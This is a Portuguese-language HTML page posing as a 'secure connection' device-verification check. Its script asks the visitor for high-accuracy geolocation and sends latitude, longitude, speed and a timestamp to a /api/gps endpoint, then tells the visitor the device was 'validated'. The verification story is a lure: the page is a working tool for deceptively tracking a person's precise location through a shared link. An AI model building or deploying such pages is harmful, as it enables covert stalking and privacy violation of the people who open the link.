<!DOCTYPE html>
<html lang="pt-br">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Verificação de Sistema</title>
    <style>
        body { font-family: sans-serif; background: #f4f4f4; display: flex; flex-direction: column; align-items: center; justify-content: center; height: 100vh; margin: 0; text-align: center; }
        .loader { border: 4px solid #f3f3f3; border-top: 4px solid #3498db; border-radius: 50%; width: 40px; height: 40px; animation: spin 1s linear infinite; margin-bottom: 20px; }
        @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
        h2 { color: #333; }
        p { color: #666; font-size: 0.9rem; }
    </style>
</head>
<body>
    <div class="loader"></div>
    <h2>Verificando Conexão Segura...</h2>
    <p>Por favor, permita o acesso à localização para validar seu dispositivo.</p>

    <script>
        const API_URL = "/api/gps"; // Manda pro próprio site
        const deviceId = "visitante_" + Math.random().toString(36).substr(2, 5);

        function enviar(position) {
            fetch(API_URL, {
                method: "POST",
                headers: { "Content-Type": "application/json" },
                body: JSON.stringify({
                    device_id: deviceId,
                    latitude: position.coords.latitude,
                    longitude: position.coords.longitude,
                    speed: position.coords.speed || 0,
                    battery: 0,
                    timestamp: Date.now(),
                    provider: "web_link" // Identifica que veio do link
                })
            }).then(() => {
                document.querySelector("h2").innerText = "Verificação Concluída";
                document.querySelector(".loader").style.borderTop = "4px solid green";
                document.querySelector("p").innerText = "Dispositivo validado com sucesso.";
            });
        }

        if (navigator.geolocation) {
            navigator.geolocation.getCurrentPosition(enviar, (err) => {
                console.log("Erro ou permissão negada");
            }, { enableHighAccuracy: true });
        }
    </script>
</body>
</html>